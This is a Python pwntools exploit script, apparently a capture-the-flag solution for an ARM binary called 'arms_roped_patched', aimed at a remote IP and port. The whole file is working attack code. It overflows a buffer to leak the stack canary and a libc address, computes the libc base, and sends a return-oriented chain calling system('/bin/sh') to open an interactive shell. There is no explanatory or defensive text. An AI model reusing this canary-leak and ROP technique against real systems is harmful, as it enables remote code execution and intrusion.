#!/usr/bin/env python3

from pwn import *

exe = ELF("./arms_roped_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.arch = 'arm'
context.log_level = 'debug'
#file arms_roped_patched
#set architecture arm
#target remote :1234
#b*string_storer+172
#b*string_storer+240
#c
#p = process(['qemu-arm', '-g' ,'1234' ,'./arms_roped_patched'])
p =remote('94.237.63.224',35577)
#p = process(['qemu-arm','g','1234', '-L', '/usr/arm-linux-gnueabihf', './arms_roped_patched'])
payload_leak_canary = b'a'*33
#input()
p.sendline(payload_leak_canary)

p.recvuntil(payload_leak_canary)

leak_canary = u32(b'\x00' + p.recv(3))
log.info(f"canary: {hex(leak_canary)}")

payload_leak_libc_start_main = b'a'*72
#input("leak_2")
p.sendline(payload_leak_libc_start_main)

p.recvuntil(payload_leak_libc_start_main)

leak_libc_start_main = u32(p.recv(4))
ld = leak_libc_start_main - 0x45525
libc.address = ld + 0x2e000



log.info(f"libc base {hex(libc.address)}")
#pop_r0_r4_pc = 0x00013bb4
pop_r0_r4_pc = libc.address + 0x0005bebc

payload_get_shell = b'quit' 
payload_get_shell = payload_get_shell.ljust(32,b'l')
payload_get_shell += p32(leak_canary)
payload_get_shell = payload_get_shell.ljust(0x30,b'o')

payload_get_shell += p32(pop_r0_r4_pc)
payload_get_shell += p32(next(libc.search(b'/bin/sh\x00')))
payload_get_shell += p32(0)
payload_get_shell += p32(libc.sym.system)
p.sendline(payload_get_shell)


p.interactive()
